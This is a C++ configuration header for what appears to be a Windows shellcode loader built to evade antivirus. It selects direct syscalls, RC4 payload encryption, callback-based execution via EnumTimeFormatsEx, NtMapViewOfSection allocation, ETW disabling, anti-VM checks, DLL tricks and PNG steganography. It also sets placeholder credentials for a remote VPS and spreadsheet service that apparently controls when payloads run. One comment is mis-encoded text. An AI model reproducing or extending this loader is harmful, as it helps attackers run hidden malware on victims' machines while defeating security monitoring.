#pragma once
#include <Windows.h>
#include "Struct.h"
#include "Tools.h"

//  ====================  CONFIG  ==========================
static BOOLEAN isSyscall = TRUE;
static EncryptMethod encryptMethod = CASE_RC4;
static ExecutionMethod ExecMethod = EnumCallback;
static EnumMethod enumMethod = CASE_EnumTimeFormatsEx;
static BOOLEAN EnableAntiVM = FALSE;
static BOOLEAN AntiDefenderVM = FALSE;
static BOOLEAN trick_DllGetClassObject = TRUE;
static BOOLEAN trick_SxInDll = TRUE;
static AllocateMethod allocateMethod = CASE_NtMapOfView;
static BOOLEAN checkVXQQ = FALSE;
static BOOLEAN EnableSteg = FALSE;
static BOOLEAN DisableETW = TRUE;
static BOOLEAN EnableMultiplePayloadControl = TRUE;
static wchar_t const* stegPath = ENCRYPT_WSTR("\\1.png");
static BOOLEAN EnableAccessControl = TRUE;

// ◊º»Îøÿ÷∆≈‰÷√
static std::string AppID = ENCRYPT_STR("xxxxxxxxxxxx");
static std::string AppSecret = ENCRYPT_STR("xxxxxxxxxxxx");
static std::string VpsUrl = ENCRYPT_STR("http://xxxxxxxxx/");
static std::string SheetID = ENCRYPT_STR("xxxxxx");
static std::string SpreadsheetToken = ENCRYPT_STR("xxxxxxxx");
// ==================== CONFIG END ==========================
